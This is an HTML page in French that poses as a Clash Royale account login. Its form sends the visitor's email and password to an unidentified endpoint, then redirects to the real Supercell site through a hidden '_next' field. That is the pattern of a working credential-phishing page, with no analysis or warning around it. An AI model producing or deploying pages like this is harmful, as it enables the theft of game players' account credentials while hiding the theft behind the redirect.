<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clash Royale - Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
    font-family:Arial,sans-serif;
    background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
}
.container{
    max-width:400px;
    width:90%;
    text-align:center;
}
.logo img{
    width:200px;
    filter:drop-shadow(0 4px 8px rgba(0,0,0,0.3));
    margin-bottom:30px;
}
.form-container{
    background:rgba(255,255,255,0.95);
    padding:40px;
    border-radius:15px;
    box-shadow:0 20px 40px rgba(0,0,0,0.3);
}
h2{
    color:#2c3e50;
    margin-bottom:25px;
    font-size:24px;
}
.input-group{
    margin-bottom:20px;
    text-align:left;
}
label{
    display:block;
    color:#555;
    margin-bottom:8px;
    font-weight:500;
}
input{
    width:100%;
    padding:15px;
    border:2px solid #e1e8ed;
    border-radius:8px;
    font-size:16px;
    transition:border-color 0.3s;
}
input:focus{
    outline:none;
    border-color:#f39c12;
}
.login-btn{
    width:100%;
    padding:15px;
    background:linear-gradient(45deg,#f39c12,#e67e22);
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    font-weight:bold;
    cursor:pointer;
    transition:transform 0.2s;
}
.login-btn:hover{
    transform:translateY(-2px);
}
</style>
</head>
<body>
<div class="container">
    <div class="logo">
        <img src="https://clan.sportskeeda.com/clash-royale/image/clash-royale-logo.png" alt="Clash Royale">
    </div>
    <div class="form-container">
        <h2>Connexion à votre compte</h2>
        <form action="dZZZCz6YX" method="POST">
            <div class="input-group">
                <label>Email</label>
                <input type="email" name="email" required placeholder="votre@email.com">
            </div>
            <div class="input-group">
                <label>Mot de passe</label>
                <input type="password" name="password" required>
            </div>
            <input type="hidden" name="_next" value="https://supercell.com/en/games/clashroyale/">
            <button type="submit" class="login-btn">Se connecter</button>
        </form>
    </div>
</div>
</body>
</html>
